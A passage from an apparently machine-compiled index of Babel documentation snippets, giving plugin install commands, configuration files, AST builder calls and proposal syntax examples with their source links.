the `.babelrc` configuration file. This preset allows Babel to compile ES2015 code to ES5 compatible code.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-10-31-setting-up-babel-6.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"presets\": [\"es2015\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Install @babel/plugin-syntax-class-static-block\nDESCRIPTION: Installs the @babel/plugin-syntax-class-static-block package as a development dependency using npm or yarn. This command allows the Babel parser to recognize class static block syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-class-static-block.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-class-static-block\n```\n\n----------------------------------------\n\nTITLE: Environment Variable Replacement\nDESCRIPTION: This JavaScript code snippet shows an example of how the plugin replaces `process.env.NODE_ENV` with its actual value (assuming it's 'development').\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-inline-environment-variables.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n// assuming process.env.NODE_ENV is actually \"development\"\nprocess.env.NODE_ENV;\n```\n\n----------------------------------------\n\nTITLE: Use Babel CLI with preset-es2015\nDESCRIPTION: Runs the Babel CLI to transform a script.js file using the @babel/preset-es2015 preset. This command transforms the specified JavaScript file using the preset.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-es2015.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nbabel script.js --presets @babel/preset-es2015\n```\n\n----------------------------------------\n\nTITLE: Create Import Expression AST Node (JavaScript)\nDESCRIPTION: Creates an `ImportExpression` AST node using the `t.importExpression` builder.  This node represents an import expression. Parameters include the source expression and the options expression.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_83\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.importExpression(source, options);\n```\n\n----------------------------------------\n\nTITLE: Class Properties Example\nDESCRIPTION: Example class with static and instance properties used to illustrate the effect of `setPublicClassFields` option. Includes both initialized and uninitialized properties.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-class-properties.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Bork {\n  static a = \"foo\";\n  static b;\n\n  x = \"bar\";\n  y;\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin with Options (babel.config.json)\nDESCRIPTION: This example shows how to configure the @babel/plugin-transform-template-literals plugin in a babel.config.json file with the 'loose' option set to true.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-template-literals.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\n      \"@babel/plugin-transform-template-literals\",\n      {\n        \"loose\": true\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Optional Chaining Assign Plugin\nDESCRIPTION: Installs the @babel/plugin-syntax-optional-chaining-assign package as a development dependency using npm or yarn. This allows parsing of optional chaining assignment syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-optional-chaining-assign.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-optional-chaining-assign\n```\n\n----------------------------------------\n\nTITLE: TypeScript import/export statements (TypeScript)\nDESCRIPTION: Demonstrates the usage of `import ... = require(...)` and `export = { ... }` syntax, used with `verbatimModuleSyntax` in TypeScript.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-05-26-7.22.0.md#_snippet_9\n\nLANGUAGE: typescript\nCODE:\n```\nimport A = require(\"./a\");\n\nexport = { x: 2 };\n```\n\n----------------------------------------\n\nTITLE: Installing babel-helper-mark-eval-scopes with npm\nDESCRIPTION: This command installs the babel-helper-mark-eval-scopes package as a development dependency using npm. This helper is used to mark eval scopes within Babel transformations.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-mark-eval-scopes.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-helper-mark-eval-scopes --save-dev\n```\n\n----------------------------------------\n\nTITLE: Creating a TSTypeAssertion Node in JavaScript\nDESCRIPTION: This snippet shows how to create a `TSTypeAssertion` AST node using Babel's `t.tsTypeAssertion` method. It requires a type annotation and an expression.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_212\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsTypeAssertion(typeAnnotation, expression);\n```\n\n----------------------------------------\n\nTITLE: Creating a TS As Expression Node in Babel\nDESCRIPTION: Creates a `TSAsExpression` AST node using the Babel types module. This node represents an `as` expression in TypeScript, requiring an expression and a type annotation.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_160\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsAsExpression(expression, typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: Transpile with CLI\nDESCRIPTION: This command shows how to use the Babel CLI to transpile a TypeScript file using the @babel/preset-typescript preset. Requires the babel CLI to be installed globally or locally.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-typescript.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nbabel --presets @babel/preset-typescript script.ts\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration for Pipeline Operator\nDESCRIPTION: This code snippet shows the babel.config.json configuration required to enable the Hack-style pipeline operator with the `^` topic token. It uses the `@babel/plugin-proposal-pipeline-operator` plugin with the `proposal` option set to `hack` and the `topicToken` option set to `^`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-10-29-7.16.0.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    [\"@babel/plugin-proposal-pipeline-operator\", {\n      \"proposal\": \"hack\",\n      \"topicToken\": \"^\"\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Transformed WASM Import (Node.js ESM)\nDESCRIPTION: This JavaScript code shows the transformed output for Node.js using ECMAScript modules, reading the WASM file using `fs.readFileSync` and creating a `WebAssembly.Module` instance.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-import-wasm-source.md#_snippet_2\n\nLANGUAGE: js\nCODE:\n```\nimport { readFileSync as _readFileSync } from \"fs\";\nconst libMod = new WebAssembly.Module(_readFileSync(new URL(import.meta.resolve(\"./lib.wasm\"))));\n```\n\n----------------------------------------\n\nTITLE: Install babel-plugin-minify-infinity via npm JavaScript\nDESCRIPTION: This command installs the babel-plugin-minify-infinity package as a development dependency using npm. It assumes that npm is installed and configured on the system. The `--save-dev` flag ensures that the package is added to the `devDependencies` section of the `package.json` file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-infinity.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-minify-infinity --save-dev\n```\n\n----------------------------------------\n\nTITLE: Creating a TSTypeParameterDeclaration Node in JavaScript\nDESCRIPTION: This snippet demonstrates how to create a `TSTypeParameterDeclaration` AST node using Babel's `t.tsTypeParameterDeclaration` method. It takes an array of `TSTypeParameter` as an argument, which defines the type parameters.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_216\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsTypeParameterDeclaration(params);\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/helpers\nDESCRIPTION: This command installs the @babel/helpers package as a development dependency using npm or yarn.\nSOURCE: https://github.com/babel/website/blob/main/docs/helpers.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/helpers\n```\n\n----------------------------------------\n\nTITLE: Transforming Code with Caller Metadata in Babel\nDESCRIPTION: This snippet demonstrates how to use the `babel.transform` function with the `caller` option to pass metadata to presets and plugins. Specifically, it shows how `babel-loader` can provide information to `@babel/preset-env` to automatically disable the module transformation.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_20\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabel.transform(\"code;\", {\n  filename,\n  presets: [\"@babel/preset-env\"],\n  caller: {\n    name: \"babel-loader\",\n    supportsStaticESM: true,\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via npm\nDESCRIPTION: Command to install the `@babel/plugin-proposal-partial-application` as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-partial-application.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-proposal-partial-application\n```\n\n----------------------------------------\n\nTITLE: Using Babel Parser Error Codes JavaScript\nDESCRIPTION: This code snippet demonstrates how to use the error codes provided by @babel/parser when errorRecovery is enabled. It parses code with a syntax error and logs the error's code and reasonCode properties.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_38\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst { parse } = require(\"@babel/parser\");\n\nconst ast = parse(`a b`, { errorRecovery: true });\n\nconsole.log(ast.errors[0].code); // BABEL_PARSER_SYNTAX_ERROR\nconsole.log(ast.errors[0].reasonCode); // MissingSemicolon\n```\n\n----------------------------------------\n\nTITLE: Plugin Configuration in babel.config.json (JSON)\nDESCRIPTION: This configuration shows how to enable the `@babel/plugin-transform-regenerator` plugin in `babel.config.json` without any specific options. This tells Babel to use the plugin when transforming code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regenerator.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-regenerator\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Install @babel/plugin-transform-for-of\nDESCRIPTION: This command shows how to install the @babel/plugin-transform-for-of plugin using npm. It adds the plugin as a development dependency to your project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-for-of.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-for-of\n```\n\n----------------------------------------\n\nTITLE: Method Extraction with Promise (ES6)\nDESCRIPTION: This JavaScript (ES6) snippet uses `.bind` to achieve the same effect as method extraction in ES7.  It binds `console.log` to the `then` method of a Promise, printing the resolved value.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-05-14-function-bind.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Which could be written in ES6 as:\nPromise.resolve(123).then(console.log.bind(console));\n```\n\n----------------------------------------\n\nTITLE: Configuring Mocha test script with Babel (Mocha 3)\nDESCRIPTION: This JSON snippet shows the `test` script in `package.json` using `--compilers` to register Babel for Mocha. This configures Mocha to use Babel to transpile JavaScript files before running tests, supporting modern JavaScript syntax. Note: `--compilers` is deprecated in Mocha v4 and later.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/mocha/usage.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"scripts\": {\n    \"test\": \"mocha --compilers js:@babel/register\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: TypeScript 3.4 readonly Array Example JavaScript\nDESCRIPTION: Illustrates the use of the `readonly` modifier for arrays in TypeScript 3.4, preventing modification of the array's contents after initialization. Requires TypeScript 3.4 or later and the Babel TypeScript plugin.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-03-19-7.4.0.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst vowels: readonly string[] = [\"a\", \"e\", \"i\", \"o\", \"u\"];\n```\n\n----------------------------------------\n\nTITLE: babel-traverse: Adding new sibling methods - JavaScript\nDESCRIPTION: This demonstrates the addition of new helper methods for `babel-traverse` to simplify accessing siblings of a node path. The code provides examples of how to use `path.getPrevSibling()`, `path.getNextSibling()`, `path.getAllPrevSiblings()`, and `path.getAllNextSiblings()` to navigate the AST.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-02-13-6.23.0.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\npath.getPrevSibling(); // path.getSibling(path.parentPath.key - 1)\npath.getNextSibling(); // path.getSibling(path.parentPath.key + 1)\npath.getAllPrevSiblings(); // returns Array<NodePath> of previous siblings\npath.getAllNextSiblings();// returns Array<NodePath> of next siblings\n```\n\n----------------------------------------\n\nTITLE: Using Smart Pipeline Operator in JavaScript\nDESCRIPTION: This code snippet shows the usage of the Smart Pipeline Operator proposal in JavaScript. It demonstrates how to chain function calls using the `|>` operator. Note that this operator is still a proposal and requires the `@babel/plugin-proposal-pipeline-operator` plugin with the `proposal: \"smart\"` option to be enabled in Babel.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-01-21-7.3.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nname\n  |> # || throw new TypeError()\n  |> doubleSay(#, ', ')\n  |> capitalize\n  |> # + '!'\n  |> new User.Message(#)\n  |> stream.write(#, { sync: true })\n  |> console.log;\n```\n\n----------------------------------------\n\nTITLE: Transform Computed Properties - Output\nDESCRIPTION: This code snippet demonstrates the JavaScript code outputted by the @babel/plugin-transform-computed-properties plugin. It shows how computed properties are transformed using _defineProperty helper function.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-computed-properties.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _obj;\n\nfunction _defineProperty(obj, key, value) {\n  if (key in obj) {\n    Object.defineProperty(obj, key, {\n      value: value,\n      enumerable: true,\n      configurable: true,\n      writable: true,\n    });\n  } else {\n    obj[key] = value;\n  }\n\n  return obj;\n}\n\nvar obj = ((_obj = {}),\n_defineProperty(_obj, \"x\" + foo, \"heh\"),\n_defineProperty(_obj, \"y\" + bar, \"noo\"),\n_defineProperty(_obj, \"foo\", \"foo\"),\n_defineProperty(_obj, \"bar\", \"bar\"),\n_obj);\n```\n\n----------------------------------------\n\nTITLE: BigInt usage - JavaScript\nDESCRIPTION: This code snippet demonstrates the usage of BigInt and how Babel transforms it to use a helper function for binary expressions.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\n50000n + 60n;\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport babelCheckBinaryExpressions from \"babel-check-binary-expressions\";\nbabelCheckBinaryExpressions(new BigInt(\"50000\"), new BigInt(\"60\"), \"+\");\n```\n\n----------------------------------------\n\nTITLE: Inline Elements Usage with Babel JavaScript\nDESCRIPTION: Shows how to enable the `inlineElements` optimization for React in Babel using the `optional` option within the `transform` function. It is crucial to only enable this optimization in production environments.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_13\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"babel\").transform(\"code\", {\n  optional: [\"optimisation.react.inlineElements\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Module Blocks in Babel 7\nDESCRIPTION: Presents an example of module blocks in Babel 7. Module blocks allow creating inline modules with their own scope and exports.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_34\n\nLANGUAGE: javascript\nCODE:\n```\nlet m = module { export let y = 1; };\n```\n\n----------------------------------------\n\nTITLE: TSImportType AST (Babel 7)\nDESCRIPTION: Babel 7 AST for TSImportType, using `typeParameters`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_39\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"TSImportType\",\n  \"argument\": StringLiteral(\"./Array\"),\n  \"typeParameters\": {\n    \"type\": \"TSTypeParameterInstantiation\",\n\n```\n\n----------------------------------------\n\nTITLE: TSMethodSignature AST (Babel 8)\nDESCRIPTION: Babel 8 AST for TSMethodSignature, using `params` and `returnType`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_19\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"TSMethodSignature\",\n  \"key\": Identifier(\"foo\"),\n  \"params\": [\n    { \"type\": \"Identifier\", \"name\": \"x\", \"typeAnnotation\": { \"type\": \"TSNumberKeyword\" } }\n  ],\n  \"retutnType\": {\n    \"type\": \"TSTypeAnnotation\",\n    \"typeAnnotation\": { \"type\": \"TSStringKeyword\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: REPL with input history using rlwrap\nDESCRIPTION: Launches a babel-node REPL with input history using rlwrap. rlwrap provides readline functionality, allowing you to recall and edit previous commands.\nSOURCE: https://github.com/babel/website/blob/main/docs/node.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nrlwrap npx babel-node\n```\n\n----------------------------------------\n\nTITLE: Checking for TypeScript Entity Names in JavaScript\nDESCRIPTION: This snippet uses `t.isTSEntityName(node)` to determine if an AST node represents a TypeScript entity name. It covers `Identifier` and `TSQualifiedName` nodes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_295\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isTSEntityName(node);\n```\n\n----------------------------------------\n\nTITLE: Transform with Node API\nDESCRIPTION: This JavaScript code demonstrates how to use the Babel Node API to transform TypeScript code with the @babel/preset-typescript preset. Requires @babel/core package.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-typescript.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  presets: [\"@babel/preset-typescript\"],\n  filename: 'script.ts',\n});\n```\n\n----------------------------------------\n\nTITLE: Creating a Pipeline Topic Expression in Babel\nDESCRIPTION: Creates a `PipelineTopicExpression` AST node using the Babel types module.  This node represents a topic expression within a pipeline. The expression argument is mandatory.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_139\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.pipelineTopicExpression(expression);\n```\n\n----------------------------------------\n\nTITLE: Configure Babel with plugin-transform-modules-amd\nDESCRIPTION: This JSON configuration shows how to enable the plugin in your babel.config.json file.  This is the recommended way to use the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-amd.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-modules-amd\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Execute Makefile with Shell\nDESCRIPTION: This shell script executes the make command, triggering the compilation process defined in the Makefile. It requires the Makefile to be present in the same directory.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/make/usage.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nmake\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Preset Flow JSON\nDESCRIPTION: This JSON configuration file shows how to include the @babel/preset-flow preset in your Babel configuration.  This configuration can be used in babel.config.json or .babelrc.json\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-flow.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-flow\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Babel plugin\nDESCRIPTION: This command installs the `@babel/plugin-transform-arrow-functions` plugin as a development dependency.  This plugin transforms arrow functions into ES5 compatible function expressions.\nSOURCE: https://github.com/babel/website/blob/main/docs/usage.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-arrow-functions\n```\n\nLANGUAGE: shell\nCODE:\n```\n./node_modules/.bin/babel src --out-dir lib --plugins=@babel/plugin-transform-arrow-functions\n```\n\n----------------------------------------\n\nTITLE: Template Literals Revision (JavaScript)\nDESCRIPTION: This snippet showcases the use of template literals with unicode escape sequences and how they are handled in Babel 7.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_24\n\nLANGUAGE: javascript\nCODE:\n```\ntag`\\unicode and \\u{55}`;\n```\n\n----------------------------------------\n\nTITLE: Creating Module Expression in JavaScript\nDESCRIPTION: This snippet creates a `ModuleExpression` AST node using Babel's `t.moduleExpression` builder. It requires a `body` which is a `Program` AST node.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_113\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.moduleExpression(body);\n```\n\n----------------------------------------\n\nTITLE: Creating File in JavaScript\nDESCRIPTION: This snippet shows how to create a `File` AST node using Babel's `t.file` method. The `program` parameter (a `Program` node) is required. The `comments` (an array of `CommentBlock` or `CommentLine` nodes) and `tokens` (an array of any type) parameters are optional.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_68\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.file(program, comments, tokens);\n```\n\n----------------------------------------\n\nTITLE: Partial Application Proposal Support in Babel\nDESCRIPTION: This snippet demonstrates support for the Partial Application proposal, allowing to partially apply arguments to a function. The `?` placeholder indicates the position where the arguments will be inserted during the partial application. Babel needs to be configured to transform this syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/features-timeline.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nstrings.map(parseInt(?));\n```\n\n----------------------------------------\n\nTITLE: CommonJS Preset Export JavaScript\nDESCRIPTION: Shows an example of a preset that utilizes CommonJS module exports. This format was used before ES6 modules were supported. The example exports an object containing plugins using `module.exports`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-09-28-6.16.0.md#_snippet_11\n\nLANGUAGE: babel.config.js\nCODE:\n```\nmodule.exports = {\n  plugins: [\n    require(\"babel-plugin-syntax-trailing-function-commas\")\n  ]\n};\n```\n\n----------------------------------------\n\nTITLE: Running Fixtures with @babel/helper-transform-fixture-test-runner in JavaScript\nDESCRIPTION: This code snippet demonstrates how to import and use the `runFixtures` function from the `@babel/helper-transform-fixture-test-runner` package. It takes a directory path containing test fixtures as an argument and executes those tests. The fixture directory path is passed as a string.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-transform-fixture-test-runner.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport runFixtures from \"@babel/helper-transform-fixture-test-runner\";\n\nrunFixtures(\"/User/sebmck/Projects/babel-something/test/fixtures\");\n```\n\n----------------------------------------\n\nTITLE: Preset options configuration change in package.json (diff)\nDESCRIPTION: This code snippet shows how to update the Babel configuration in `package.json` when using preset options.  It demonstrates how to pass options to the `env` preset instead of `es2015`, maintaining functionality like module handling.\nSOURCE: https://github.com/babel/website/blob/main/docs/env.md#_snippet_2\n\nLANGUAGE: diff\nCODE:\n```\n{\n  \"presets\": [\n+   [\"env\", {\n-   [\"es2015\", {\n      \"modules\": false\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/preset-env\nDESCRIPTION: This command installs the @babel/preset-env package as a development dependency using npm. It's a prerequisite for using the preset in a Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-env.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/preset-env\n```\n\n----------------------------------------\n\nTITLE: Node API Usage JavaScript\nDESCRIPTION: This JavaScript code snippet illustrates how to use the Babel Node API to transform JavaScript code with the @babel/plugin-transform-modules-umd plugin programmatically.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-umd.md#_snippet_14\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-modules-umd\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Transforming JavaScript code using Babel.transform\nDESCRIPTION: This demonstrates how to transform JavaScript code using the Babel.transform function. It shows how to specify presets in the options object.\nSOURCE: https://github.com/babel/website/blob/main/docs/standalone.md#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nvar input = 'const getMessage = () => \"Hello World\";';\nvar output = Babel.transform(input, { presets: [\"env\"] }).code;\n```\n\n----------------------------------------\n\nTITLE: Dynamic Property Names with Template Strings in React\nDESCRIPTION: Demonstrates the use of template strings to dynamically set property names in the state of an ES6 React component.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-07-07-react-on-es6-plus.md#_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\nclass Form extends React.Component {\n  onChange(inputName, e) {\n    this.setState({\n      [`${inputName}Value`]: e.target.value,\n    });\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Plugin Installation via npm\nDESCRIPTION: This command installs the @babel/plugin-transform-flow-comments plugin as a development dependency using npm. This is necessary to use the plugin in your Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-flow-comments.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-flow-comments\n```\n\n----------------------------------------\n\nTITLE: Transform Template Literals (Out)\nDESCRIPTION: This example showcases the output JavaScript code after the template literal has been transformed by the plugin, using the `concat` method.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-template-literals.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n\"foo\".concat(bar);\n```\n\n----------------------------------------\n\nTITLE: Plugin Installation via npm\nDESCRIPTION: This command installs the @babel/plugin-transform-parameters plugin as a development dependency using npm.  It is required before using the plugin to transform code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-parameters.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-parameters\n```\n\n----------------------------------------\n\nTITLE: JavaScript Debugger Removal (Example)\nDESCRIPTION: Demonstrates the effect of the babel-plugin-transform-remove-debugger plugin. The 'debugger;' statement is removed from the input JavaScript code during transformation.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-remove-debugger.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\ndebugger;\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n\n```\n\n----------------------------------------\n\nTITLE: Install Babel plugin using npm\nDESCRIPTION: Command to install the `@babel/plugin-transform-named-capturing-groups-regex` plugin as a development dependency using npm.  This is a prerequisite to using the plugin in a Babel project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-named-capturing-groups-regex.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-named-capturing-groups-regex\n```\n\n----------------------------------------\n\nTITLE: Configure module plugin options in babel.config.js\nDESCRIPTION: This code snippet demonstrates how to move root AMD/UMD/SystemJS options to the module plugin options, using `@babel/plugin-transform-modules-systemjs` as an example. It shows how to specify `moduleIds`, `moduleRoot`, and `getModuleId` within the plugin configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nmodule.exports = {\n  plugins: [\n    ['@babel/plugin-transform-modules-systemjs', {\n        // highlight-start\n        moduleIds: true,\n        moduleRoot: 'myApp',\n        getModuleId (name) {\n          return name + \"suffix\";\n        },\n        // highlight-end\n    }],\n  ],\n};\n```\n\n----------------------------------------\n\nTITLE: Transpiling JavaScript with broccoli-babel-transpiler (JavaScript)\nDESCRIPTION: This code snippet demonstrates how to use the `broccoli-babel-transpiler` to transpile JavaScript code. It requires the `broccoli-babel-transpiler` module to be installed. The `inputTree` represents the input directory containing JavaScript files, and `options` is an object containing configuration options for the Babel transpilation process. The result is a new Broccoli tree (`scriptTree`) containing the transpiled JavaScript files.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/broccoli/usage.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar babelTranspiler = require(\"broccoli-babel-transpiler\");\nvar scriptTree = babelTranspiler(inputTree, options);\n```\n\n----------------------------------------\n\nTITLE: Smart Pipeline Operator Example in JavaScript\nDESCRIPTION: This code shows examples of the Smart and Simple Pipeline Operators.  The Smart Pipeline Operator uses `#` as a placeholder. Requires `@babel/parser` to parse, but Babel doesn't transpile it yet. Placeholder is subject to change.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-12-03-7.2.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n// \"Smart\"\nconst result = 2 |> double |> 3 + # |> toStringBase(2, #); // \"111\"\n\n// \"Simple\"\nconst result = 2 |> double |> (x => 3 + x) |> (x => toStringBase(2, x));\n```\n\n----------------------------------------\n\nTITLE: Configuring Decorator Plugin Version in Babel (JSON)\nDESCRIPTION: This snippet configures the `@babel/plugin-proposal-decorators` plugin in `babel.config.json` to use the `2023-11` version of the decorators proposal. This ensures that Babel's decorator implementation matches the latest specification, particularly regarding the execution order of initializers registered through `context.addInitializer`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2024-02-28-7.24.0.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\"@babel/plugin-proposal-decorators\", {\n      \"version\": \"2023-11\"\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: codeFrameColumns with end location\nDESCRIPTION: Shows how to use `codeFrameColumns` with both `start` and `end` locations to highlight a range of code within the frame.\nSOURCE: https://github.com/babel/website/blob/main/docs/code-frame.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nimport { codeFrameColumns } from \"@babel/code-frame\";\n\nconst rawLines = `class Foo {\\n  constructor() {\\n    console.log(\"hello\");\\n  }\\n}`;\nconst location = {\n  start: { line: 2, column: 17 },\n  end: { line: 4, column: 3 },\n};\n\nconst result = codeFrameColumns(rawLines, location, {\n  /* options */\n});\n\nconsole.log(result);\n```\n\n----------------------------------------\n\nTITLE: Minifying JavaScript with CLI and nested preset options\nDESCRIPTION: This command demonstrates using nested preset options with the babel-minify CLI. It sets options for `mangle` and `deadcode` plugins to keep class names and function arguments respectively, and also specifies an output file.\nSOURCE: https://github.com/babel/website/blob/main/docs/minify.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nminify input.js --mangle.keepClassName --deadcode.keepFnArgs --outFile input.min.js\n```\n\n----------------------------------------\n\nTITLE: 